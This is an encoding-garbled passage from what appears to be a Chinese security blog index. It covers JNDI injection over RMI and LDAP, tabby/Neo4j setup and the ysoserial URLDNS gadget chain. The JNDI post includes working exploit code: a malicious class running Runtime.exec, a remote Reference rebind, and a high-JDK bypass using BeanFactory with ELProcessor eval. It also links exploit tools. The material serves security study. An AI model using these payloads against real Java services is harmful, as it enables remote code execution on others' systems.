//åˆ›å»ºä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨lookupå‡½æ•°è¿›è¡Œè°ƒç”¨æŸ¥è¯¢ InitialContext initialContext = new InitialContext(); IHello iHelloobj = (IHello) initialContext.lookup(&quot;rmi://localhost:1099/hello&quot;); System.out.println(iHelloobj.sayHello(&quot;aa&quot;)); }} æœåŠ¡ç«¯ï¼š package org.example;import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.Properties;public class CallService { public static void main(String[] args) throws Exception{ //é…ç½®JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£ã€‚å¦‚æœæ²¡æœ‰é…ç½®è¿™äº›ä¿¡æ¯ï¼Œä¼šå‡ºç°NoInitialContextExceptionå¼‚å¸¸ Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;); // åˆ›å»ºåˆå§‹åŒ–ç¯å¢ƒ Context ctx = new InitialContext(env); // åˆ›å»ºä¸€ä¸ªrmiæ˜ å°„è¡¨ Registry registry = LocateRegistry.createRegistry(1099); // åˆ›å»ºä¸€ä¸ªå¯¹è±¡ IHello hello = new IHelloImpl(); // å°†å¯¹è±¡ç»‘å®šåˆ°rmiæ³¨å†Œè¡¨ registry.bind(&quot;hello&quot;, hello);// // jndiçš„æ–¹å¼è·å–è¿œç¨‹å¯¹è±¡// IHello rhello = (IHello) ctx.lookup(&quot;rmi://localhost:1099/hello&quot;);// // è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•// System.out.println(rhello.sayHello(&quot;axin&quot;)); }} ##JNDI+RMIæ³¨å…¥æˆ‘ä»¬é¦–å…ˆè®©æœåŠ¡ç«¯é‡æ–°ç»‘å®šè‡³æ¶æ„ç±» package org.example;import javax.naming.InitialContext;import javax.naming.Reference;public class JNDIRMiServer { public static void main(String[] args) throws Exception { //åˆ›å»ºåˆå§‹ä¸Šä¸‹æ–‡ InitialContext initialContext = new InitialContext();// initialContext.rebind(&quot;rmi://localhost:1099/hello&quot;,new IHelloImpl()); Reference refObj = new Reference(&quot;T&quot;,&quot;T&quot;,&quot;http://localhost:7777/&quot;); initialContext.rebind(&quot;rmi://localhost:1099/hello&quot;,refObj); }} ç„¶åè¿™ä¸ªTå°±æ˜¯æˆ‘ä»¬çš„æ¶æ„ç±»ï¼šåªéœ€è¦å®šä¹‰æ„é€ å‡½æ•°å°±è¡Œ import java.io.IOException;public class T { public T() throws IOException { Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); }} æ­¤æ—¶ï¼Œæˆ‘ä»¬å†è®¿é—®è¿™ä¸ªrmiæœåŠ¡çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªè¿œç¨‹ç±»äº†æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹lookupå‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ï¼Œçœ‹çœ‹å…¶æ˜¯å¦‚ä½•è°ƒç”¨è¿œç¨‹ç±»çš„ï¼Œå†ç»è¿‡å¤šå±‚lookupå‡½æ•°è°ƒç”¨ä»¥åï¼Œä¼šè·å–è¿œç¨‹è®¿é—®çš„ç±»ï¼Œè¿™ä¸ªæ—¶å€™å°±å·²ç»è·å–äº†æˆ‘ä»¬çš„æ¶æ„ç±»äº†æ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨loadClassåŠ è½½è¿™ä¸ªç±»åŠ è½½å®Œä»¥åï¼Œä½¿ç”¨newInstanceå®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œæ­¤æ—¶æ„é€ å‡½æ•°å°±ä¼šè¢«è§¦å‘äº†å¯ä»¥å‘ç°ï¼ŒJNDIæ³¨å…¥çš„å…³é”®ç‚¹åœ¨äºï¼Œlookupå‡½æ•°çš„å†…å®¹å¯æ§###é«˜ç‰ˆæœ¬åœ¨JDK 6u141ã€7u131ã€8u121ä¹‹åï¼Œå¢åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ã€‚é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±æ— æ³•åƒå‰é¢ä¸€æ ·ï¼Œå¯ä»¥é‚£ä¹ˆå•çº¯çš„ç›´æ¥ä½¿ç”¨lookupå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†æ­¤æ—¶å°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´è·å–ä¸åˆ°è¿œç¨‹ç±»é‚£ä¹ˆå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ####é«˜ç‰ˆæœ¬jdkç»•è¿‡ä»”ç»†è§‚å¯Ÿå‰é¢rmiæµç¨‹ï¼Œå¯ä»¥å‘ç°ï¼Œå…¶å®æ˜¯åœ¨namingmanagerçš„åœ°æ–¹è·å–æ¶æ„ç±»çš„ï¼Œè€Œå‰é¢çš„é™åˆ¶ä¹Ÿåªæ˜¯å­˜åœ¨äºç¦æ­¢è¿œç¨‹è®¿é—®è€Œå·²å¯ä»¥å‘ç°ä¸Šé¢ifæœ‰ä¸‰ä¸ªæ¡ä»¶åˆ¤æ–­ å…¶ä¸­ç¬¬ä¸€ä¸ªåˆ¤æ–­çš„réœ€è¦ä¸æ˜¯å¼•ç”¨å¯¹è±¡ï¼Œæˆ‘ä»¬ä»è¿œç¨‹å¯¹è±¡å¼•ç”¨çš„åŸºæœ¬å°±æ˜¯å¼•ç”¨å¯¹è±¡äº†ï¼Œè¿™é‡Œå°±ä¸å¤ªæœ‰æ“ä½œçš„ç©ºé—´ è€Œç¬¬äºŒä¸ªé€šè¿‡å‡½æ•°è¿”å›äº†ä¸‹é¢è¿œç¨‹åœ°å€çš„å€¼ï¼Œå¦‚æœè¿™ä¸ªæ˜¯nullçš„è¯ï¼Œä¹Ÿä¼šç»•è¿‡ï¼Œå¦‚æœå¯¹åº”çš„ factory æ˜¯æœ¬åœ°ä»£ç ï¼Œåˆ™è¯¥å€¼ä¸ºç©ºï¼Œè¿™æ˜¯ç»•è¿‡é«˜ç‰ˆæœ¬ JDK é™åˆ¶çš„å…³é”® ç¬¬ä¸‰ä¸ªå°±æ˜¯é»˜è®¤çš„å‚æ•°ï¼Œåªèƒ½è‡ªå·±é…ç½®æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæœ¬åœ°çš„factoryï¼Œè§¦å‘è‡³è¿™ä¸ªnamingmanagerå³å¯ ä»ç¬¬äºŒä¸ªæ–¹æ³•å…¥æ‰‹ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦å…³æ³¨getFactoryClassLocationå‡½æ•°ï¼šè¿”å›classFactoryLocationå±æ€§è€Œè¿™ä¸ªå±æ€§æœ¬æ¥æ˜¯nullå€¼åœ¨ä¸‹é¢æ„é€ å‡½æ•°è¿‡ç¨‹ä¸­è¢«ä¼ å…¥é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œçš„Locationè¦ä¸ä¼ å€¼ï¼Œå°±åªèƒ½åˆ©ç”¨æœ¬åœ°äº†ï¼Œé‚£ä¹ˆå°±æ‰¾æ‰¾æœ¬åœ°æœ‰æ²¡æœ‰åˆ©ç”¨çš„factoryè·Ÿè¿›ä¸€ä¸‹NamingManager.getObjectInstanceæ–¹æ³•å…³æ³¨è¿™éƒ¨åˆ†ä»£ç ï¼Œå¯ä»¥å‘ç°è¿™é‡Œä¼šæ‰§è¡Œfactoryè¿™ä¸ªç±»çš„getObjectInstanceæ–¹æ³•æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»å¹¶ä¸”å¯ä»¥æ‰§è¡ŒgetObjectInstanceæ–¹æ³•ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿™ä¸ªç±»è¿˜éœ€è¦å®ç°ObjectFactoryè¿™ä¸ªæ¥å£ï¼Œæ‰èƒ½ä½¿ç”¨getObjectInstanceæ–¹æ³•æ ¹æ®å‰é¢çš„åˆ†æï¼Œæ€»ç»“ä¸€ä¸‹æˆ‘ä»¬éœ€è¦ å¯»æ‰¾ç›®æ ‡æœ¬åœ°çš„å·¥å‚ç±» è¯¥å·¥å‚ç±»éœ€è¦å®ç°javax.naming.spi.ObjectFactory å­˜åœ¨ä¸€ä¸ªgetObjectInstance()æ–¹æ³• è¿™é‡Œè¯´ä¸€ä¸‹å¦‚ä½•æ‰¾åˆ°çš„ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“éœ€è¦å®ç°ObjectFactoryæ¥å£ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ideaæ‰“å¼€çœ‹çœ‹ï¼Œç›´æ¥æ‰¾åˆ°è¿™ä¸ªå€Ÿå£ï¼Œç„¶åç‚¹å‡»æ—è¾¹çš„å°æ ‡å¿—å°±å¯ä»¥åœ¨Tomcat8çš„ä¾èµ–åŒ…ä¸­org.apache.naming.factory.BeanFactoryå°±æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œé¦–å…ˆå®ç°äº†javax.naming.spi.ObjectFactoryï¼Œå¹¶ä¸”å­˜åœ¨getObjectInstanceæ–¹æ³•ï¼Œå¯ä»¥åå°„æ‰§è¡Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ payloadï¼š1.é¦–å…ˆè§‚å¯Ÿç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œå…¶å¿…é¡»å±äºresourceRefç±»çš„å®ä¾‹åŒ–å¯¹è±¡è·å–ç±»åä»¥åï¼Œä¼šå¯¹å…¶è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¹¶ä¸”éœ€è¦å…³æ³¨çš„æ˜¯æ­¤å¤„ä¸ºclass.newInstanceï¼Œè€Œä¸æ˜¯ä½¿ç”¨construcotæ¥è¿›è¡ŒnewInstanceï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æ— å‚æ„é€ æ–¹æ³•ï¼Œå†å¾€ä¸‹å®¡è®¡ï¼Œå¯ä»¥å‘ç°è¿™é‡Œä¼šè·å–forceStringå­—æ®µï¼Œè€Œè¿™ä¸ªå­—æ®µæ˜¯ä»resourcerefç±»ä¸­çš„refaddrè·å–åˆ°çš„åœ¨è¿™é‡Œè·å–åˆ°forceStringçš„å€¼åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œcontentså’Œaddrtypeï¼Œå…¶ä¸­addrtypeæ˜¯æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„æ‰§è¡Œçš„å‡½æ•°å…¶ä¸­addrtypeæ˜¯æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„æ‰§è¡Œçš„å‡½æ•°é¦–å…ˆä¼šå®šä½ï¼Œæ˜¯å¦å«æœ‰=å·ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œä¼šå°†åé¢çš„å€¼ä½œä¸ºsetterNameçš„å€¼ç»§ç»­å‘ä¸‹ä¼ é€’ï¼Œåœ¨è¿™é‡ŒsetterNameä¼šä½œä¸ºåé¢beaClassè¦è·å–çš„æ–¹æ³•ï¼Œè€ŒparamTypesåˆ™æ˜¯String.classï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œä¼ å…¥çš„å‚æ•°æ˜¯Stringç±»å‹çš„å†å¾€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œåšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œä¼ å…¥çš„refaddrä¸­ï¼Œå¦‚æœä¸ä¸ºé‡Œé¢çš„å†…å®¹å¦‚forcedï¼Œåˆ™ä¼šè¿›å…¥åˆ°æ¥ä¸‹æ¥çš„ä»£ç ä¸­è·å–è¿™ä¸ªå‚æ•°çš„contentå†å¾€ä¸‹ï¼Œä¼šè·å–è¿™ä¸ªå‚æ•°çš„methodå¹¶å°†å‰é¢è·å–çš„è¿™ä¸ªå‚æ•°çš„contentä½œä¸ºè¦æ‰§è¡Œçš„å€¼ï¼Œæœ€åinvokeåå°„æ‰§è¡Œ åˆ†æå®Œå‰é¢çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸€ä¸‹ï¼šé¦–å…ˆä¼ å…¥ä¸€ä¸ªresourceRefç±»ï¼Œå…¶factoryé€‰æ‹©org.apache.naming.factory.BeanFactoryï¼Œè€Œè¦è°ƒç”¨çš„æ¶æ„ä»£ç æ‰§è¡Œç±»éœ€è¦æ»¡è¶³ æ— å‚æ„é€  æœ‰èƒ½å¤Ÿæ‰§è¡ŒStringç±»å‹å‚æ•°çš„æ–¹æ³•é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ä¼ å€¼çš„è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œåœ¨RefAddrçš„å‚æ•°æ„é€ è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ å‡ºå¦‚ä¸‹æ ¼å¼force x=(function)x param è€Œæ»¡è¶³ä¸Šè¿°æ¶æ„ç±»çš„è¦æ±‚ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©javax.el.ELProcessorï¼Œå¹¶ä½¿ç”¨evalæ¥æ‰§è¡ŒStringç±»å‹çš„å‘½ä»¤ 1.é¦–å…ˆå…ˆæ„é€ ä¸€ä¸ªResourceRefç±»ï¼Œç„¶åå…¶ä¸­ä¼ å…¥æˆ‘ä»¬èƒ½å¤Ÿæ— å‚æ¶æ„ç±»,è¿™é‡Œçš„å‚æ•°æ„é€ ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹å…¶æ„é€ å‡½æ•°å°±å¯ä»¥çŸ¥é“ä¸ºå•¥è¦è¿™æ ·ä¼ å…¥äº† ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;,null,&quot;&quot;,&quot;&quot;,true, &quot;org.apache.naming.factory.BeanFactory&quot;,null); 2.ä¼ å…¥refaddrå‚æ•°ä½¿ç”¨å…¶addæ–¹æ³• ref.add(new StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;)); ref.add(new StringRefAddr(&quot;x&quot;,&quot;Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')&quot;)); å› ä¸ºè¦ä½¿ç”¨ javax.el.ELProcessorï¼Œæ‰€ä»¥éœ€è¦ Tomcat 8+æˆ–SpringBoot 1.2.x+å°ç»“ï¼šç”±äºä½¿ç”¨çš„æ˜¯javax.el.ELProcessorç±»ï¼Œæ‰€ä»¥æ˜¯éœ€è¦æœ‰tomcat8åŠæ›´é«˜ç‰ˆæœ¬ç¯å¢ƒä¸‹é€šè¿‡è¯¥åº“è¿›è¡Œæ”»å‡» å·¥å…·ï¼šä½¿ç”¨ https://github.com/welk1n/JNDI-Injection-Bypassï¼Œæ”¾åœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨ä¸€ä¸ªæ¶æ„ RMI Serverhttps://github.com/mbechler/marshalsec ##JNDI+LDAPæ³¨å…¥ä½¿ç”¨LDAPåè®®åŒæ ·ä¹Ÿå¯ä»¥å®ç°jdniæ³¨å…¥###ä½ç‰ˆæœ¬JDKè¿è¡Œåœ¨ä½ç‰ˆæœ¬çš„jdkä¸­ï¼Œè¿‡æ»¤äº†rmiåè®®ä»¥åï¼Œä¾æ—§å¯ä»¥ldapæ¥è¿›è¡Œç»•è¿‡ä¸åŒçš„æ˜¯ï¼ŒLDAPæœåŠ¡ä¸­lookupæ–¹æ³•ä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€ä½¿ç”¨çš„æ˜¯LDAPåè®®ï¼Œç”±æ”»å‡»è€…æ§åˆ¶LDAPæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ¶æ„jndi Referenceå¯¹è±¡ï¼Œå¹¶ä¸”LDAPæœåŠ¡çš„Referenceè¿œç¨‹åŠ è½½Factoryç±»å¹¶ä¸æ˜¯ä½¿ç”¨RMI Class Loaderæœºåˆ¶ï¼Œå› æ­¤ä¸å—trustURLCodebaseé™åˆ¶ã€‚","link":"/2023/01/20/java-jndi%E6%B3%A8%E5%85%A5/"},{"title":"java-tabbyå®‰è£…","text":"##Neo4jå¦‚æœç»è¿‡å¾ˆå¤šçš„å¯¼å…¥/åˆ é™¤æ“ä½œï¼Œå›¾æ•°æ®åº“å ç”¨äº†å¾ˆå¤šçš„ç¡¬ç›˜å­˜å‚¨ï¼Œé‚£ä¹ˆå¯ä»¥å°†åŸæœ‰çš„å›¾æ•°æ®åº“åˆ é™¤ï¼Œé‡æ–°æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤æ–°å»ºå›¾æ•°æ®åº“ã€‚ åˆ é™¤æ‰€æœ‰çº¦æŸ DROP CONSTRAINT c1;DROP CONSTRAINT c2;DROP CONSTRAINT c3;DROP CONSTRAINT c4;DROP INDEX index1;DROP INDEX index2;DROP INDEX index3;DROP INDEX index4;DROP INDEX index5;DROP INDEX index6;DROP INDEX index7; ##ä½¿ç”¨æ•™ç¨‹è¿™é‡Œä½¿ç”¨çš„javaç‰ˆæœ¬æ˜¯è¦ä½¿ç”¨tabbyï¼Œé¦–å…ˆéœ€è¦å¯¼å‡ºé¡¹ç›®æ‰€æœ‰JaråŒ…ã€‚åœ¨IDEAä¸­ï¼Œå¯ä»¥é€šè¿‡â€File -&gt; Project Structure -&gt; Project Settings -&gt; Artifactsâ€ä¸­æ·»åŠ ä¸€ä¸ªArtifactï¼Œå°†é¡¹ç›®æ‰“åŒ…å‡ºæ¥ï¼Œè¿™æ ·ä¾¿èƒ½é¡ºåˆ©å¯¼å‡ºæ‰€æœ‰é¡¹ç›®ç›¸å…³çš„jaråŒ…ä»¥ä¾›tabbyåˆ†æã€‚éšåè¿è¡Œâ€Build -&gt; Build Artifacts -&gt; Rebuildâ€å³å¯å¯¼å‡ºåˆ°/outç›®å½•ä¸­ã€‚éšåæˆ‘ä»¬å°†è¿™äº›jaråŒ…å…¨æ”¾åˆ°ä¸Šæ–‡â€å®‰è£…tabbyâ€œä¸€èŠ‚ä¸­ï¼Œåˆ›å»ºçš„jarsç›®å½•ä¸‹ã€‚åœ¨è¿è¡Œæœ€å¥½å°†/cacheç›®å½•ä¸‹çš„æ–‡ä»¶åˆ é™¤ã€‚éšåè¿è¡Œå‘½ä»¤##Neo4jæŸ¥è¯¢ Neo4jæ˜¯ä¸€ä¸ªå›¾æ•°æ®åº“ Neo4jæ˜¯ä¸€ä¸ªå›¾æ•°æ®åº“ï¼Œéœ€è¦å…ˆæ˜ç™½å¦‚ä¸‹å‡ ç‚¹ï¼š Neo4jç”¨çš„æ˜¯CQLæŸ¥è¯¢è¯­è¨€çš„å›¾æ•°æ®åº“ï¼Œå’ŒMySQLè¿™äº›ä½¿ç”¨SQLæŸ¥è¯¢è¯­è¨€çš„å…³ç³»å‹æ•°æ®åº“è¯­æ³•ä¸ä¸€æ ·ã€‚ä½†æ˜¯æ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼Œæ— éæ˜¯ æ•°æ®æŸ¥è¯¢+æ¡ä»¶ç­›é€‰å…³ç³»å‹æ•°æ®åº“å­˜æ”¾çš„æ•°æ®æ˜¯æŒ‰è¡Œå’Œåˆ—æŸ¥è¯¢ï¼Œè€Œå›¾æ•°æ®åº“æ˜¯ç”¨èŠ‚ç‚¹å’Œå…³ç³»è¾¹è¿›è¡ŒæŸ¥è¯¢ã€‚åœ¨ä»£ç åˆ†æä¸­ï¼Œæœ‰ä¸¤ä¸ªå…³é”®æœ¯è¯­ï¼šSourceå’ŒSinkã€‚Sourceæ˜¯è¾“å…¥ï¼Œå³ç”¨æˆ·å¯æ§éƒ¨åˆ†ï¼›Sinkæ˜¯æ±‡èšç‚¹ï¼Œå³å±é™©ä»£ç ã€‚Tabbyçš„æ€è·¯æ˜¯ï¼šé€šè¿‡Neo4jå›¾æ•°æ®åº“çš„èŠ‚ç‚¹å’Œå…³ç³»è¾¹ï¼Œå°†æ¯ä¸ªæ–¹æ³•ä¹‹é—´çš„è°ƒç”¨é“¾ç”¨Neo4jçš„å…³ç³»è¾¹ä¸²è”èµ·æ¥ã€‚æˆ‘ä»¬ä¾¿å¯æŸ¥è¯¢Sourceåˆ°Sinkä¹‹é—´çš„è°ƒç”¨è·¯å¾„ã€‚ ##æŸ¥è¯¢æ¨¡ç‰ˆ match (source:Method {NAME:&quot;execute&quot;})match (sink:Method {IS_SINK:true, NAME:&quot;getInstance&quot;})&lt;-[:CALL]-(m1:Method)call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 20) yield path return * limit 20 å…¶ä¸­match()è¡¨ç¤ºåŒ¹é…å“ªäº›èŠ‚ç‚¹ï¼Œç±»ä¼¼äºSQLä¸­çš„selectã€‚åœ¨match(source:Method{NAME:â€executeâ€})è¿™å¥è¯ä¸­ï¼Œsourceæ˜¯åˆ«åï¼ŒMethodæ˜¯èŠ‚ç‚¹ç±»,{NAME:â€executeâ€}æ˜¯åŒ¹é…çš„èŠ‚ç‚¹å†…å®¹ï¼Œâ€”â€”ã€‹éƒ½æ˜¯æ¥è‡ªtabbyç”Ÿæˆçš„csvæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸€èˆ¬æ˜¯ç±»jsonæ ¼å¼ï¼Œæœ‰ä¸¤ä¸ªå…³é”®çš„èŠ‚ç‚¹ï¼šMethodå’ŒClass","link":"/2022/12/21/java-tabby%E5%AE%89%E8%A3%85/"},{"title":"javaå®¡è®¡-ååºåˆ—åŒ–","text":"readObject/writeObjectjavaåœ¨åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå°†ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡ä¸­çš„writeobjectæ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯objectOutputStreamï¼Œå¼€å‘è€…å¯ä»¥å°†ä»»ä½•å†…å®¹å†™å…¥è¿™ä¸ªstreamä¸­ï¼Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨readObjectï¼Œå¼€å‘è€…ä¹Ÿå¯ä»¥ä»ä¸­è¯»å–å‡ºå‰é¢å†™å…¥çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ç† ysoserial-URLDNSgadget chainsï¼šåˆ©ç”¨é“¾ URLDNSæ˜¯ysoserialä¸­ä¸€ä¸ªåˆ©ç”¨é“¾çš„åå­—ï¼Œå…¶ç»“æœæ˜¯ä¸€æ¬¡DNSè¯·æ±‚ ä½œç”¨ ä½¿ç”¨javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ä¾èµ– åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ åˆ©ç”¨é“¾åˆ†æè§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•æ˜¯readObjectï¼Œä¸ºäº†ç ”ç©¶ysoserialä¸­çš„è¿™ä¸ªåˆ©ç”¨é“¾ï¼Œæˆ‘ä»¬ä»payloadå…¥æ‰‹ï¼Œå…¶ä¸­å†™åˆ° public class URLDNS implements ObjectPayload&lt;Object&gt;{ public Object getObject(final String url) throws Exception{ ...... HashMap ht = new HashMap(); }} å¯ä»¥å‘ç°ï¼Œåœ¨getObjectä¸­è¿”å›çš„è¢«ååºåˆ—åŒ–çš„å¯¹è±¡æ˜¯HashMapï¼Œå› æ­¤æ¥ä¸‹æ¥å°±æ˜¯åœ¨è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹ï¼Œè·Ÿä¸€ä¸‹å…¶è¿‡ç¨‹ å¦‚ä½•ä½¿ç”¨ysoserialé¡¹ç›®è¿›è¡Œè°ƒè¯•æ‰“å¼€å·¥ç¨‹ï¼Œç„¶åé’ˆå¯¹ç¼ºå°‘çš„ä¾èµ–ï¼Œå¯ä»¥ç›´æ¥ç‚¹å‡»+å·è¿›è¡Œæ·»åŠ  æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹pom.xmlå¯ä»¥å‘ç°ä¸»ç±»æ˜¯ ysoserial.GeneratePayload æ¥ä¸‹æ¥åˆ°è¿™ä¸ªä¸»ç±»è¿™é‡Œè¿›è¡Œåˆ†æï¼Œç„¶åå³é”®ç‚¹å‡»å¼€å§‹debugï¼Œåœ¨ä¸Šé¢è®¾ç½®ä¸€ä¸‹å‚æ•° å¯ä»¥å‘ç°å·²ç»è·‘èµ·æ¥äº†ï¼Œå¹¶ä¸”åœ¨æ–­ç‚¹è¿™é‡Œåœä¸‹äº† åˆ†æURLDNSçš„getObjectä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œæ‰€ä»¥æ¥è¿™é‡Œè¿›è¡Œåˆ†æï¼Œå‘ç°å…¶è°ƒç”¨äº†HasMap()ï¼Œå¹¶ä¸”è¿™è¾¹æ³¨é‡Šåˆ°ä¼šé“¾æ¥åˆ°URL åœ¨hashmapå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆçœ‹çœ‹ååºåˆ—åŒ–æ–¹æ³•readObject(),è€Œå…¶ä¸­æ¯”è¾ƒç‰¹æ®Šçš„ç‚¹å°±åœ¨è¿™é‡Œï¼Œåœ¨å‰é¢æ‰€è¯´ The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). å› æ­¤æˆ‘ä»¬ç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•° å¯ä»¥å‘ç°ï¼Œåœ¨hashå‡½æ•°è°ƒç”¨äº†hashcodeçš„æ–¹æ³•ï¼Œå¹¶ä¸”æ­¤æ—¶ä¼ å…¥æˆ‘ä»¬ä¸€å¼€å§‹è®¾å®šçš„url å†å¾€ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™é‡Œçš„handleræ˜¯æŒ‡å‘ä¸€ä¸ªurlç±»çš„ï¼ˆä¸€å¼€å§‹æˆ‘åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯åˆå§‹åŒ–debugçš„æ—¶å€™ï¼Œä¹Ÿä¼šç»è¿‡è¿™é‡Œï¼Œè€Œé‚£ä¸ªåªæ˜¯åœ¨å¯»æ‰¾jaråŒ…ï¼Œæ‰€ä»¥è¿™é‡Œçš„keyçš„å±æ€§å°±ä¸åŒäº†ï¼Œå¯¼è‡´åé¢çš„handleræŒ‡å‘çš„å‡½æ•°ä¹Ÿä¸åŒï¼Œæœ‰å¾ˆå¤šåŒåå‡½æ•°ï¼‰ è€Œæ­¤æ—¶çš„handlerå°±ä¼šæŒ‡å‘URLStreamHandlerçš„hashCodeæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªhashcodeæ–¹æ³•ä¸­å¯ä»¥å‘ç°è°ƒç”¨äº†getHostAddress ç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°è°ƒç”¨äº†getByName InetAddress.getByName(host) çš„ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡DNSæŸ¥è¯¢ã€‚ æ€»ç»“è¿™æ¬¡çš„Gadgetæµç¨‹å¦‚ä¸‹:1.HashMap-&gt;readObject()2.HashMap-&gt;hash()3.URL-&gt;hashCode()4.URLStreamHandler-&gt;hashCode()5.URLStreamHandler-&gt;getHostAddress()6.InetAddress-&gt;getByName() pocçŸ¥é“æ•´æ¡åˆ©ç”¨é“¾ä»¥åï¼Œå°±è¦å­¦ä¹ ä¸€ä¸‹å¦‚ä½•ç¼–å†™ååºåˆ—åŒ–expäº†ï¼Œåé¢å†æ¥è¡¥å‘","link":"/2022/04/04/java_URLDNS/"},{"title":"java_ccé“¾å°ç»“","text":"##å‰è¨€æ„Ÿè§‰è‡ªå·±æœ€è¿‘è¶Šæ¥è¶Šæµ®èºäº†ï¼Œä¹Ÿæ²¡æœ‰é™ä¸‹å¿ƒæ¥å¥½å¥½åˆ†æç‚¹ä»€ä¹ˆï¼Œæ‰€ä»¥è¿™æ¬¡æ‰“ç®—å¥½å¥½æ•´ç†ä¸€ä¸‹ä¹‹å‰å­¦è¿‡çš„CCé“¾ ##æ€»è§ˆ ##CC11.é€‚ç”¨ç‰ˆæœ¬ï¼šcommons-collections 3.2.12.ç»†èŠ‚æè¿°åœ¨æ„é€ 